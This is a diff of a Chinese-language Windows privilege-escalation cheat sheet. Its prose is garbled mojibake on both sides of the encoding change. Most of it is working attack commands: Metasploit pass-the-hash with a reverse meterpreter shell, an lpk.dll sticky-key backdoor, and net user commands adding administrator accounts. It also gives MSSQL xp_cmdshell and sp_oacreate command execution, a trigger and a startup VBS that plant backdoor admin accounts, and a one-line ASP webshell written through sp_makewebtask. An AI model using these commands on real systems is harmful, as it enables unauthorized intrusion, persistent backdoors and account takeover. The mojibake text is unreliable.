@@ -1,76 +1,76 @@
-windowsÌáÈ¨
+ï»¿windowsææƒ
 {
-Ò»¡¢ÏµÍ³Â©¶´ÌáÈ¨£¨»º³åÇøÒç³öÂ©¶´£©
+ä¸€ã€ç³»ç»Ÿæ¼æ´ææƒï¼ˆç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼‰
 {
-	1.Òç³öÌáÈ¨:
+	1.æº¢å‡ºææƒ:
 	{
-		1>±¾µØÒç³ö
+		1>æœ¬åœ°æº¢å‡º
 		{
-			Ô­Àí£ºÓĞÖ´ĞĞµÄÈ¨ÏŞµÄÓÃ»§Ïò·şÎñÆ÷ÉÏ´«±¾µØÒç³ö³ÌĞò£¬ÔÚ·şÎñÆ÷¶ËÖ´ĞĞ£¬Èç¹ûÏµÍ³´æÔÚÂ©¶´£¬ÄÇÃ´½«Òç³öroot/AdminstratorÈ¨ÏŞ¡£
-			×¢Òâ£º²»ÒªÕÒ´ø¿Õ¸ñµÄÄ¿Â¼£¬expºó×º¿ÉÒÔ¸ü¸Ä£¬ÕÒ¿É¶ÁĞ´Ä¿Â¼
+			åŸç†ï¼šæœ‰æ‰§è¡Œçš„æƒé™çš„ç”¨æˆ·å‘æœåŠ¡å™¨ä¸Šä¼ æœ¬åœ°æº¢å‡ºç¨‹åºï¼Œåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œï¼Œå¦‚æœç³»ç»Ÿå­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆå°†æº¢å‡ºroot/Adminstratoræƒé™ã€‚
+			æ³¨æ„ï¼šä¸è¦æ‰¾å¸¦ç©ºæ ¼çš„ç›®å½•ï¼Œexpåç¼€å¯ä»¥æ›´æ”¹ï¼Œæ‰¾å¯è¯»å†™ç›®å½•
 			a.pr
 				pr.com "whoami"
-			b.°ÍÎ÷¿¾Èâ
+			b.å·´è¥¿çƒ¤è‚‰
 			churr
 		}
-		2>Ô¶³ÌÒç³ö
+		2>è¿œç¨‹æº¢å‡º
 		{
-			Ô­Àí£ºÔ¶³ÌÒç³öÌáÈ¨ÊÇÖ¸¹¥»÷ÕßÖ»ĞèÒªÓë·şÎñÆ÷½¨Á¢ÍøÂçÁ¬½Ó£¬È»ºó¸ù¾İÏµÍ³µÄÂ©¶´£¬Ê¹ÓÃÏàÓ¦µÄexp£¬¼´¿É»ñÈ¡µ½Ô¶³Ì·şÎñÆ÷µÄrootÈ¨ÏŞ¡£
+			åŸç†ï¼šè¿œç¨‹æº¢å‡ºææƒæ˜¯æŒ‡æ”»å‡»è€…åªéœ€è¦ä¸æœåŠ¡å™¨å»ºç«‹ç½‘ç»œè¿æ¥ï¼Œç„¶åæ ¹æ®ç³»ç»Ÿçš„æ¼æ´ï¼Œä½¿ç”¨ç›¸åº”çš„expï¼Œå³å¯è·å–åˆ°è¿œç¨‹æœåŠ¡å™¨çš„rootæƒé™ã€‚
 			a.eternalblue
 		}
 	}
-	2.getpassÌáÈ¨
+	2.getpassææƒ
 	{
-		Ò»¿î»ñÈ¡¼ÆËã»úÓÃ»§ÕËºÅÃÜÂëµÄ¹¤¾ß£¬ÔËĞĞgetpass.exe¼´¿É»ñÈ¡ÓÃ»§ÃÜÂë
+		ä¸€æ¬¾è·å–è®¡ç®—æœºç”¨æˆ·è´¦å·å¯†ç çš„å·¥å…·ï¼Œè¿è¡Œgetpass.exeå³å¯è·å–ç”¨æˆ·å¯†ç 
 	}
-	3.hash´«µİÈëÇÖÌáÈ¨
+	3.hashä¼ é€’å…¥ä¾µææƒ
 	{
-		ÔÚmsfÖĞÖ´ĞĞ£º
-			msfconsole   //Æô¶¯ÖÕ¶Ë
-			use exploit/windows/smb/psexec //ÓÃµ½Ä£¿é
-			show options //²é¿´Ä£¿éÑ¡ÏîÊôĞÔ
-			set PAYLOAD windows/meterpreter/reverse_tcp   //ÉèÖÃÂ©¶´ÀûÓÃÔØÌå
-			Show targets //²é¿´Ä£¿éµÄ¹¥»÷Ä¿±êÊôĞÔ
-			set LHOST //ÉèÖÃ±¾»úµØÖ·
-			set RHOST 192.168.0.254 //ÉèÖÃÊôĞÔÄ¿±êÖ÷»úµØÖ·
-			set SMBUser administrators //ÉèÖÃÊôĞÔÓÃ»§
-			set SMBPass  xxx  //ÉèÖÃÊôĞÔÃÜÎÄhash£¬ÔÚWindowsÏÂÓÃPwdump7À´»ñÈ¡hashÖµ,Îª¹ÜÀíÔ±ÓÃ»§Ãû¡¢È¨ÏŞºóµÄ16½øÖÆÊıÖµ
-			exploit  //¿ªÊ¼¹¥»÷
-			shell //»ñÈ¡µ±Ç°shell,Ö´ĞĞÃüÁî
+		åœ¨msfä¸­æ‰§è¡Œï¼š
+			msfconsole   //å¯åŠ¨ç»ˆç«¯
+			use exploit/windows/smb/psexec //ç”¨åˆ°æ¨¡å—
+			show options //æŸ¥çœ‹æ¨¡å—é€‰é¡¹å±æ€§
+			set PAYLOAD windows/meterpreter/reverse_tcp   //è®¾ç½®æ¼æ´åˆ©ç”¨è½½ä½“
+			Show targets //æŸ¥çœ‹æ¨¡å—çš„æ”»å‡»ç›®æ ‡å±æ€§
+			set LHOST //è®¾ç½®æœ¬æœºåœ°å€
+			set RHOST 192.168.0.254 //è®¾ç½®å±æ€§ç›®æ ‡ä¸»æœºåœ°å€
+			set SMBUser administrators //è®¾ç½®å±æ€§ç”¨æˆ·
+			set SMBPass  xxx  //è®¾ç½®å±æ€§å¯†æ–‡hashï¼Œåœ¨Windowsä¸‹ç”¨Pwdump7æ¥è·å–hashå€¼,ä¸ºç®¡ç†å‘˜ç”¨æˆ·åã€æƒé™åçš„16è¿›åˆ¶æ•°å€¼
+			exploit  //å¼€å§‹æ”»å‡»
+			shell //è·å–å½“å‰shell,æ‰§è¡Œå‘½ä»¤
 		
 	}
-	4.lpkÌáÈ¨
+	4.lpkææƒ
 	{
-		´¥·¢£ºÄ¿Â¼ÏÂ´æÔÚexeÎÄ¼ş±»Ö´ĞĞ£¬ËûµÄÌØµãÊÇÃ¿¸ö¿ÉÖ´ĞĞÎÄ¼şÔËĞĞÖ®Ç°¶¼Òª¼ÓÔØ¸ÃÎÄ¼ş£¬windowsÏµÍ³ÊÇÏÈÅĞ¶Ïµ±Ç°ÎÄ¼şÄ¿Â¼ÊÇ·ñ´æÔÚ´ËÎÄ¼ş£¬Èç¹ûÄ¿Â¼ÏÂ´æÔÚ¸ÃÎÄ¼şÔòÖ´ĞĞ,Èç¹û²»´æÔÚÔò»áÖ´ĞĞsystem32Ä¿Â¼ÏÂµÄdll
-		Æô¶¯·½°¸£º3389Ô¶³Ì×ÀÃæÁ¬½ÓÆô¶¯£¨Á¬Ğøshift£¬È»ºó°´ÈÈ¼ü£©
-		ÌáÈ¨·½°¸£º
-			1>Éú³Élpk.dll£¬Í¨¹ıwebshellÉÏ´«ÖÁÎÄ¼şÄ¿Â¼£¬µÈ´ı¹ÜÀíÔ±È¥´¥·¢exe³ÌĞò¡£
-				ÔËĞĞLPK SetchÕâ¸ö¹¤¾ßÑ¡Ôñ£¬2¼üÆô¶¯£¬´ËÊ±µÄ2¼ü3¼üÖµÎªLPK SethcÄÚÖÃ¹Ì¶¨µÄÊı×Ö£¬±ÈÈç65,66¾Í¶ÔÓ¦aÓëb¡£
-				È»ºóµã»÷Éú³É£¬½«Éú³ÉµÄlpk.dllÉÏ´«ÖÁÈÎÒâÄ¿Â¼,²¢ÔËĞĞÆäÖĞµÄÈÎºÎÒ»¸öexeÎÄ¼ş,lpk.dll½«»á×Ô¶¯Ìæ»»ÎªshiftºóÃÅ¡£
-				È»ºóÔ¶³ÌÁ¬½Ó£¬Á¬Ğø°´Îå´Îshift¼ü£¬»á³öÏÖÕ³ÖÍ¼üµÄÌáÊ¾
-				½Ó×ÅÍ¬Ê±°´ÏÂ×éºÏ¼ü(Ò²¾ÍÊÇÔÚÄÄÀïÉèÖÃµÄ65,66,¶ÔÓ¦µÄA,B)£¬¾Í»á³öÏÖÏÂÃæµÄÃÜÂë¿ò
-				ÊäÈëÃÜÂë£¬¾Í»á½øÈëÌáÈ¨½çÃæ!!!
-			2>»¹¿ÉÒÔÓÃÀ´Ö´ĞĞÈí¼ş£¬±ÈÈçÓÃÀ´¿ª3389£¬ÔÚÉú³Élpk.dllÊÇÑ¡ÖĞÖ´ĞĞCMD£¬
-				cmdÂ·¾¶£ºC:\windows\system32/cmd.exe
-				ÃüÁî£º-pk Sethc v4\3389.vbs
-				Éú³Élpk.dllÈ»ºó·Åµ½ÈÎÒâÄ¿Â¼ÏÂ£¬Î´Ö´ĞĞÈí¼şÖ®Ç°Ô¶³ÌÊÇ¹Ø±ÕµÄ
-				È»ºóÖ´ĞĞexeÈí¼ş£¬ÄãºÃ·¢ÏÖÔ¶³Ì±»´ò¿ªÁË¡£
+		è§¦å‘ï¼šç›®å½•ä¸‹å­˜åœ¨exeæ–‡ä»¶è¢«æ‰§è¡Œï¼Œä»–çš„ç‰¹ç‚¹æ˜¯æ¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œä¹‹å‰éƒ½è¦åŠ è½½è¯¥æ–‡ä»¶ï¼Œwindowsç³»ç»Ÿæ˜¯å…ˆåˆ¤æ–­å½“å‰æ–‡ä»¶ç›®å½•æ˜¯å¦å­˜åœ¨æ­¤æ–‡ä»¶ï¼Œå¦‚æœç›®å½•ä¸‹å­˜åœ¨è¯¥æ–‡ä»¶åˆ™æ‰§è¡Œ,å¦‚æœä¸å­˜åœ¨åˆ™ä¼šæ‰§è¡Œsystem32ç›®å½•ä¸‹çš„dll
+		å¯åŠ¨æ–¹æ¡ˆï¼š3389è¿œç¨‹æ¡Œé¢è¿æ¥å¯åŠ¨ï¼ˆè¿ç»­shiftï¼Œç„¶åæŒ‰çƒ­é”®ï¼‰
+		ææƒæ–¹æ¡ˆï¼š
+			1>ç”Ÿæˆlpk.dllï¼Œé€šè¿‡webshellä¸Šä¼ è‡³æ–‡ä»¶ç›®å½•ï¼Œç­‰å¾…ç®¡ç†å‘˜å»è§¦å‘exeç¨‹åºã€‚
+				è¿è¡ŒLPK Setchè¿™ä¸ªå·¥å…·é€‰æ‹©ï¼Œ2é”®å¯åŠ¨ï¼Œæ­¤æ—¶çš„2é”®3é”®å€¼ä¸ºLPK Sethcå†…ç½®å›ºå®šçš„æ•°å­—ï¼Œæ¯”å¦‚65,66å°±å¯¹åº”aä¸bã€‚
+				ç„¶åç‚¹å‡»ç”Ÿæˆï¼Œå°†ç”Ÿæˆçš„lpk.dllä¸Šä¼ è‡³ä»»æ„ç›®å½•,å¹¶è¿è¡Œå…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªexeæ–‡ä»¶,lpk.dllå°†ä¼šè‡ªåŠ¨æ›¿æ¢ä¸ºshiftåé—¨ã€‚
+				ç„¶åè¿œç¨‹è¿æ¥ï¼Œè¿ç»­æŒ‰äº”æ¬¡shifté”®ï¼Œä¼šå‡ºç°ç²˜æ»é”®çš„æç¤º
+				æ¥ç€åŒæ—¶æŒ‰ä¸‹ç»„åˆé”®(ä¹Ÿå°±æ˜¯åœ¨å“ªé‡Œè®¾ç½®çš„65,66,å¯¹åº”çš„A,B)ï¼Œå°±ä¼šå‡ºç°ä¸‹é¢çš„å¯†ç æ¡†
+				è¾“å…¥å¯†ç ï¼Œå°±ä¼šè¿›å…¥ææƒç•Œé¢!!!
+			2>è¿˜å¯ä»¥ç”¨æ¥æ‰§è¡Œè½¯ä»¶ï¼Œæ¯”å¦‚ç”¨æ¥å¼€3389ï¼Œåœ¨ç”Ÿæˆlpk.dllæ˜¯é€‰ä¸­æ‰§è¡ŒCMDï¼Œ
+				cmdè·¯å¾„ï¼šC:\windows\system32/cmd.exe
+				å‘½ä»¤ï¼š-pk Sethc v4\3389.vbs
+				ç”Ÿæˆlpk.dllç„¶åæ”¾åˆ°ä»»æ„ç›®å½•ä¸‹ï¼Œæœªæ‰§è¡Œè½¯ä»¶ä¹‹å‰è¿œç¨‹æ˜¯å…³é—­çš„
+				ç„¶åæ‰§è¡Œexeè½¯ä»¶ï¼Œä½ å¥½å‘ç°è¿œç¨‹è¢«æ‰“å¼€äº†ã€‚
 
 	}
-	5.ÌáÈ¨³£ÓÃCMDÃüÁî
+	5.ææƒå¸¸ç”¨CMDå‘½ä»¤
 	{
-		Whoami //²é¿´µ±Ç°ÓÃ»§È¨ÏŞ
-		Systeminfo //²é¿´¼ÆËã»úµÄĞÅÏ¢£¨²Ù×÷ÏµÍ³£¬Î»Êı£¬²¹¶¡Çé¿öµÈ£©
-		Tasklist /svc //²é¿´¼ÆËã»úµÄ½ø³Ì
-		Netstat -ano //²é¿´¼ÆËã»úµÄÍøÂç¶Ë¿ÚÁ¬½Ó
-		netstart //²é¿´¼ÆËã»úµ±Ç°Æô¶¯µÄ·şÎñ
-		Net user //²é¿´¼ÆËã»úµÄÓÃ»§
-		Net user name pass /add //Ìí¼ÓÓÃ»§
-		Net localgroup administrators name /add //Ìí¼ÓÖÁ¹ÜÀíÔ±ÓÃ»§×é
-		Net user name /del É¾³ıÓÃ»§ÃûÎªnameµÄÓÃ»§ //É¾³ı
+		Whoami //æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™
+		Systeminfo //æŸ¥çœ‹è®¡ç®—æœºçš„ä¿¡æ¯ï¼ˆæ“ä½œç³»ç»Ÿï¼Œä½æ•°ï¼Œè¡¥ä¸æƒ…å†µç­‰ï¼‰
+		Tasklist /svc //æŸ¥çœ‹è®¡ç®—æœºçš„è¿›ç¨‹
+		Netstat -ano //æŸ¥çœ‹è®¡ç®—æœºçš„ç½‘ç»œç«¯å£è¿æ¥
+		netstart //æŸ¥çœ‹è®¡ç®—æœºå½“å‰å¯åŠ¨çš„æœåŠ¡
+		Net user //æŸ¥çœ‹è®¡ç®—æœºçš„ç”¨æˆ·
+		Net user name pass /add //æ·»åŠ ç”¨æˆ·
+		Net localgroup administrators name /add //æ·»åŠ è‡³ç®¡ç†å‘˜ç”¨æˆ·ç»„
+		Net user name /del åˆ é™¤ç”¨æˆ·åä¸ºnameçš„ç”¨æˆ· //åˆ é™¤
 		pwd
 		
-		ÌáÈ¨³£ÓÃÃüÁî
+		ææƒå¸¸ç”¨å‘½ä»¤
 			1.net.exe
 				net user hacker 123456 /add
 				net localgroup Administrators hacker /add
@@ -81,17 +81,17 @@ windowsÌáÈ¨
 			2.cacls
 				cacls FileName [/t] [/e] [/c] [/g User:permission] [/r User [...]] [/p User:permission [...]] [/d User [...]]
 				cacls flag.txt /e /t /g system:F
-			3.ÉÏ´«cmd.exeµ½¿ÉÒÔĞ´Ä¿Â¼ c:\temp »òÕß c:\recycler ¶¼ÓĞÈ¨ÏŞ
-				setp cmd.exe °Ñcmd.exeÉèÖÃµ½ÖÕ¶Ë
-				²é¿´µ±Ç°ÓÃ»§:whoami
-				ÏµÍ³²¹¶¡:systeminfo
-				²é¿´3389¶Ë¿Úpid:tasklist /svc
-				È»ºó netstat -ano ¶ÔÓ¦pid¾ÍÊÇ3389¶Ë¿Ú
-				½øÈë3389 
+			3.ä¸Šä¼ cmd.exeåˆ°å¯ä»¥å†™ç›®å½• c:\temp æˆ–è€… c:\recycler éƒ½æœ‰æƒé™
+				setp cmd.exe æŠŠcmd.exeè®¾ç½®åˆ°ç»ˆç«¯
+				æŸ¥çœ‹å½“å‰ç”¨æˆ·:whoami
+				ç³»ç»Ÿè¡¥ä¸:systeminfo
+				æŸ¥çœ‹3389ç«¯å£pid:tasklist /svc
+				ç„¶å netstat -ano å¯¹åº”pidå°±æ˜¯3389ç«¯å£
+				è¿›å…¥3389 
 					REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
-				ÔËĞĞmstsc
+				è¿è¡Œmstsc
 				
-		$IPCÌáÈ¨
+		$IPCææƒ
 		{
 			net view
 			net use
@@ -99,7 +99,7 @@ windowsÌáÈ¨
 			net use \\10.0.0.59 /u:10.0.0.59\ma mama
 			
 			net use z: \\10.0.0.59\c$
-			net view \\127.0.0.1	//ÔÚ \\127.0.0.1 µÄ¹²Ïí×ÊÔ´
+			net view \\127.0.0.1	//åœ¨ \\127.0.0.1 çš„å…±äº«èµ„æº
 			dir \\127.0.0.1\share			
 			dir \\10.0.0.59\d$
 			copy ntlm.exe \\127.0.0.1\admin$
@@ -110,30 +110,30 @@ windowsÌáÈ¨
 			at \\10.0.0.59
 		}
 
-hashÆÆ½âÍøÖ·
+hashç ´è§£ç½‘å€
 	http://www.objectif-securite.ch
 	}
 }
 
-¶ş¡¢ĞÅÏ¢Ğ¹Â¶ÌáÈ¨
+äºŒã€ä¿¡æ¯æ³„éœ²ææƒ
 {
 	
 }
 
 
-Èı¡¢µÚÈı·½Èí¼şÌáÈ¨£¨Êı¾İ¿â¡¢ftp¡¢·şÎñÆ÷¹ÜÀíÈí¼ş¡¢445£©
-£¨Ò»£©Êı¾İ¿âÌáÈ¨
+ä¸‰ã€ç¬¬ä¸‰æ–¹è½¯ä»¶ææƒï¼ˆæ•°æ®åº“ã€ftpã€æœåŠ¡å™¨ç®¡ç†è½¯ä»¶ã€445ï¼‰
+ï¼ˆä¸€ï¼‰æ•°æ®åº“ææƒ
 {
-	MSSQLÌáÈ¨£º
+	MSSQLææƒï¼š
 	{
-		1.²Ëµ¶¹ÜÀíÊı¾İ¿âÌáÈ¨
-		²é¿´Êı¾İ¿âÅäÖÃÎÄ¼ş£¬»ñÈ¡SAÕË»§ÃÜÂë
-		±à¼­Êı¾İ¿âÅäÖÃ£º
+		1.èœåˆ€ç®¡ç†æ•°æ®åº“ææƒ
+		æŸ¥çœ‹æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œè·å–SAè´¦æˆ·å¯†ç 
+		ç¼–è¾‘æ•°æ®åº“é…ç½®ï¼š
 			<T>ADO</T>
 			<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456</C>
-		ÓÒ¼ü¹ÜÀíÊı¾İ¿â
-		ÔÚÊı¾İ¿âÖĞÖ´ĞĞÌáÈ¨
-			ĞÅÏ¢ËÑ¼¯£º
+		å³é”®ç®¡ç†æ•°æ®åº“
+		åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œææƒ
+			ä¿¡æ¯æœé›†ï¼š
 				Exec master.dbo.xp_cmdshell 'whoami'
 				Exec master.dbo.xp_cmdshell 'systeminfo'
 				Exec master.dbo.xp_cmdshell 'netstat -ano'
@@ -141,41 +141,41 @@ hashÆÆ½âÍøÖ·
 				SELECT IS_SRVROLEMEMBER('sysadmin')
 				EXEC master..xp_cmdshell 'set'
 			
-			¶ÁÈ¡×¢²á±í
+			è¯»å–æ³¨å†Œè¡¨
 				EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
 				EXEC master..xp_regwrite HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run','F','REG_SZ','test.exe'
 			
-			´´½¨¶ÔÏóCMDshell
+			åˆ›å»ºå¯¹è±¡CMDshell
 				EXEC master..xp_dirtree 'C:\',1,1
 				EXEC master..sp_addextendedproc 'xp_cmdshell','xplog70.dll'
 				EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
 				
-			Ìí¼Ó¹ÜÀíÔ±ÓÃ»§£º
+			æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·ï¼š
 				Exec master.dbo.xp_cmdshell 'net user'
 				Exec master.dbo.xp_cmdshell 'net user mssql_tq_caidao 123 /add'
 				Exec master.dbo.xp_cmdshell 'net localgroup Administrators'
 				Exec master.dbo.xp_cmdshell 'net localgroup Administrators mssql_tq_caidao /add'
 			
-			¿ªÆô3389¶Ë¿Ú£º
+			å¼€å¯3389ç«¯å£ï¼š
 				REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
-			¹Ø±Õ3389£º
+			å…³é—­3389ï¼š
 				net stop "TermService"
 				sc config TermService start= disabled
 			
-			·şÎñ¹ÜÀí£º
+			æœåŠ¡ç®¡ç†ï¼š
 				msconfig
 				mstsc
 				services.msc
-		2.´óÂí¹ÜÀíÊı¾İ¿âÌáÈ¨
-		ÉÏ´«´óÂí
-		1>Á¬½ÓÊı¾İ¿â
-		Ö´ĞĞÊı¾İ¿âÌáÈ¨²éÑ¯Óï¾ä
+		2.å¤§é©¬ç®¡ç†æ•°æ®åº“ææƒ
+		ä¸Šä¼ å¤§é©¬
+		1>è¿æ¥æ•°æ®åº“
+		æ‰§è¡Œæ•°æ®åº“ææƒæŸ¥è¯¢è¯­å¥
 			Exec master.dbo.xp_cmdshell ' '
-		2>Ö´ĞĞaspµÄshellÃüÁî
-			cmdÃüÁî  sa   pass
-		3>db_owner²åÈë´¥·¢Æ÷ÌáÈ¨
-			ÔÚdb_wnerËûËùÔÚ¹ÜÀíµÄ±íÀï£¬´´½¨Ò»¸ö´¥·¢Æ÷,µÈ¹ÜÀíÔ±ÓÃsaÓÃ»§È¥Ö´ĞĞ²åÈë±íÃüÁîµÄÊ±ºò»á´¥·¢£¬´ïµ½ÌáÈ¨µÄĞ§¹û
-			´´½¨´¥·¢Æ÷ÃüÁî
+		2>æ‰§è¡Œaspçš„shellå‘½ä»¤
+			cmdå‘½ä»¤  sa   pass
+		3>db_owneræ’å…¥è§¦å‘å™¨ææƒ
+			åœ¨db_wnerä»–æ‰€åœ¨ç®¡ç†çš„è¡¨é‡Œï¼Œåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨,ç­‰ç®¡ç†å‘˜ç”¨saç”¨æˆ·å»æ‰§è¡Œæ’å…¥è¡¨å‘½ä»¤çš„æ—¶å€™ä¼šè§¦å‘ï¼Œè¾¾åˆ°ææƒçš„æ•ˆæœ
+			åˆ›å»ºè§¦å‘å™¨å‘½ä»¤
 				create TRIGGER TR_HACKER1 ON bairong_Users
 				AFTER INSERT
 				AS
@@ -185,11 +185,11 @@ hashÆÆ½âÍøÖ·
 					EXECUTE MASTER.DBO.XP_CMDSHELL 'net user xiaoguai www.h4x0er.com /add'
 					EXECUTE MASTER.DBO.XP_CMDSHELL 'net localgroup administrators xiaoguai /add'
 				End
-			µ±¹ÜÀíÔ±ÔÚbairong_UsersÕâ¸ö±íÀï²åÈëUsername:xiaoguai£»Password:11111µÄÊ±ºò,¾Í»á´¥·¢ÎÒÃÇÁôÏÂµÄºóÃÅ£º
+			å½“ç®¡ç†å‘˜åœ¨bairong_Usersè¿™ä¸ªè¡¨é‡Œæ’å…¥Username:xiaoguaiï¼›Password:11111çš„æ—¶å€™,å°±ä¼šè§¦å‘æˆ‘ä»¬ç•™ä¸‹çš„åé—¨ï¼š
 				INSERT INTO bairong_Users(UserName,Password) VALUES('xiaoguai','11111')
-		4>Æô¶¯ÏîÌáÈ¨
-			ÀûÓÃdb_ownerµÄÈ¨ÏŞ±¸·İµ½Æô¶¯ÏîÄÇÀï,Ğ´´´½¨ÕËºÅµÄÃÜÂëµÄbat»òvbs,
-				ÉÏ´«Â·¾¶ C:\\Documents and Settings\\All Users\\¡¸¿ªÊ¼¡¹²Ëµ¥\\³ÌĞò\\Æô¶¯\\add.vbs
+		4>å¯åŠ¨é¡¹ææƒ
+			åˆ©ç”¨db_ownerçš„æƒé™å¤‡ä»½åˆ°å¯åŠ¨é¡¹é‚£é‡Œ,å†™åˆ›å»ºè´¦å·çš„å¯†ç çš„batæˆ–vbs,
+				ä¸Šä¼ è·¯å¾„ C:\\Documents and Settings\\All Users\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨\\add.vbs
 				add.vbs:
 					set wsnetwork=CreateObject("WSCRIPT.NETWORK")
 					os="WinNT://"&wsnetwork.ComputerName
@@ -201,7 +201,7 @@ hashÆÆ½âÍøÖ·
 					Set of=GetObject(os&"/web",user)
 					oe.add os&"/web"
 
-			ÆäÊµÔÚMMSQL ÖĞÈç¹û¿ªÆôÁË SQL Server Agent ·şÎñµÄ»°¿ÉÒÔÍ¨¹ıµÍÈ¨ÏŞÏÂ½¨Á¢ÕÊ»§.
+			å…¶å®åœ¨MMSQL ä¸­å¦‚æœå¼€å¯äº† SQL Server Agent æœåŠ¡çš„è¯å¯ä»¥é€šè¿‡ä½æƒé™ä¸‹å»ºç«‹å¸æˆ·.
 			Code:
 				EXEC sp_add_job @job_name = jktest,
 				@enabled = 1,
@@ -214,103 +214,103 @@ hashÆÆ½âÍøÖ·
 				EXEC sp_add_jobServer @job_name = jktest,
 				@Server_name = <%=Servername%>
 				EXEC sp_start_job @job_name = jktest
-		5>É³ÅÌÌáÈ¨:
-			¿ªÆôÉ³ÅÌÄ£Ê½;exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE/Microsoft/Jet/4.0/Engines','SandBoxMode','REG_DWORD',1--
-			È»ºóÀûÓÃjet.oledbÖ´ĞĞÏµÍ³ÃüÁî:
+		5>æ²™ç›˜ææƒ:
+			å¼€å¯æ²™ç›˜æ¨¡å¼;exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE/Microsoft/Jet/4.0/Engines','SandBoxMode','REG_DWORD',1--
+			ç„¶ååˆ©ç”¨jet.oledbæ‰§è¡Œç³»ç»Ÿå‘½ä»¤:
 				select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("cmd.exe /c cmdline")')--
-			p.s£º2000ÏµÍ³WINDOWS¸ÄÎªWINNT
+			p.sï¼š2000ç³»ç»ŸWINDOWSæ”¹ä¸ºWINNT
 			
-		6>ÀûÓÃSQL´úÀíÖ´ĞĞÃüÁî£¬µ±È»±ØĞëÏÈ¿ªÆôSQL´úÀí·şÎñ£¬Ä¬ÈÏÇé¿öÏÂÕâ¸ö·şÎñÊÇ¹Ø±ÕµÄ.
-		ÎÒÃÇ¿ÉÒÔÏÈÀûÓÃxp_servicecontrol¿ªÆôSQLSERVERAGENT£¬È»ºó½¨Á¢¸öSQL¼Æ»®ÈÎÎñ£¬È»ºóÂíÉÏÔËĞĞÕâ¸öÈÎÎñ¡£
+		6>åˆ©ç”¨SQLä»£ç†æ‰§è¡Œå‘½ä»¤ï¼Œå½“ç„¶å¿…é¡»å…ˆå¼€å¯SQLä»£ç†æœåŠ¡ï¼Œé»˜è®¤æƒ…å†µä¸‹è¿™ä¸ªæœåŠ¡æ˜¯å…³é—­çš„.
+		æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨xp_servicecontrolå¼€å¯SQLSERVERAGENTï¼Œç„¶åå»ºç«‹ä¸ªSQLè®¡åˆ’ä»»åŠ¡ï¼Œç„¶åé©¬ä¸Šè¿è¡Œè¿™ä¸ªä»»åŠ¡ã€‚
 			exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT' 
 			use msdb exec sp_delete_job null,'x'  
 			exec sp_add_job 'x' 
 			exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c Dir C:\'  
 			exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x'
 
-		3.´¢´æ¹ı³ÌÖ±½ÓÌáÈ¨
-		SAÈ¨ÏŞ:ÀûÓÃXP_CMDSHELL,Sp_OACreateµÈ´¢´æ¹ı³ÌÖ±½ÓÌáÈ¨.(Ç°Ìá´¢´æ¹ı³Ì½¡ÔÚ)
-		Ïà¹ØSQLÓï¾ä
+		3.å‚¨å­˜è¿‡ç¨‹ç›´æ¥ææƒ
+		SAæƒé™:åˆ©ç”¨XP_CMDSHELL,Sp_OACreateç­‰å‚¨å­˜è¿‡ç¨‹ç›´æ¥ææƒ.(å‰æå‚¨å­˜è¿‡ç¨‹å¥åœ¨)
+		ç›¸å…³SQLè¯­å¥
 			XP_CMDSHELL:
-				Êı×ÖĞÍ£ºEXEC MASTER.DBO.XP_CMDSHELL 'CMDLINE'--
-				×Ö·ûĞÍ&ËÑË÷ĞÍ£ºEXEC MASTER.DBO.XP_CMDSHELL 'CMDLINE'--
+				æ•°å­—å‹ï¼šEXEC MASTER.DBO.XP_CMDSHELL 'CMDLINE'--
+				å­—ç¬¦å‹&æœç´¢å‹ï¼šEXEC MASTER.DBO.XP_CMDSHELL 'CMDLINE'--
 			Sp_OACreate:
-				Êı×ÖĞÍ:declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c cmdline'--
-				×Ö·ûĞÍ&ËÑË÷ĞÍ:declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c cmdline'--
-			p.s.(2000ÏµÍ³WINDOWS¸ÄÎªWINNT)
+				æ•°å­—å‹:declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c cmdline'--
+				å­—ç¬¦å‹&æœç´¢å‹:declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c cmdline'--
+			p.s.(2000ç³»ç»ŸWINDOWSæ”¹ä¸ºWINNT)
 		
-		Ö±½Ó±¸·İÒ»¾ä»°Ä¾Âí£º
-			exec sp_makewebtask 'WEB¾ø¶ÔÂ·¾¶/fuck.asp',' select ''<%25execute(request("a"))%25>'' ';--
-			P.S.(WEBÓëDATAÔÚÍ¬Ò»Ö÷»ú,ÖªµÀWEBÄ¿Â¼)
-		4.¹¤¾ßÌáÈ¨
+		ç›´æ¥å¤‡ä»½ä¸€å¥è¯æœ¨é©¬ï¼š
